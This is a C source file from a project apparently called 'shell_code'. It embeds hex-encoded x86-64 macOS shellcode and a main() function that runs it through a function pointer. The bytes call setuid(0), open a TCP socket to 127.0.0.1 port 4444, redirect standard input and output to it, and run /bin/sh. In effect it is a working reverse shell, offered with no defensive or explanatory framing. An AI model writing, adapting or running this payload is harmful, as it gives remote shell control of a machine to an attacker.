/*
This file is part of shell_code.

    shell_code is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License.

    shell_code is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with shell_code.  If not, see <http://www.gnu.org/licenses/>.
*/
#include <stdio.h>
#include <string.h>

 
__attribute__((section("__TEXT,__text")))
char code[] ="\x41\xb0\x02\x49\xc1\xe0\x18\x49\x83\xc8\x17\x4c\x89\xc0\x48\x31"
            "\xff\x48\x31\xf6\x0f\x05\x41\xb0\x02\x49\xc1\xe0\x18\x49\x83\xc8"
            "\x61\x4c\x89\xc0\x40\xb7\x02\x40\xb6\x01\x48\x31\xd2\x0f\x05\x49"
            "\x89\xc4\x41\xb0\x01\x49\xc1\xe0\x18\x49\x83\xc8\x7f\x41\x50\x66"
            "\x68\x11\x5c\x66\x6a\x02\x49\x89\xe5\x41\xb0\x02\x49\xc1\xe0\x18"
            "\x49\x83\xc8\x62\x4c\x89\xc0\x4c\x89\xe7\x4c\x89\xee\xb2\x10\x0f"
            "\x05\x41\xb0\x02\x49\xc1\xe0\x18\x49\x83\xc8\x5a\x4c\x89\xc0\x4c"
            "\x89\xe7\x4c\x89\xfe\x0f\x05\x49\x83\xff\x02\x49\xff\xc7\x76\xe1"
            "\x41\xb0\x02\x49\xc1\xe0\x18\x49\x83\xc8\x3b\x4c\x89\xc0\x48\x31"
            "\xff\x57\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7"
            "\x48\x31\xf6\x48\x31\xd2\x0f\x05";

main()
{
	// function pointer
	int (*function)();
	
	// cast shellcode as a function
	function = (int(*)())code;
	
	// execute shellcode function
	(int)(*function)();
	return 0;
 
}



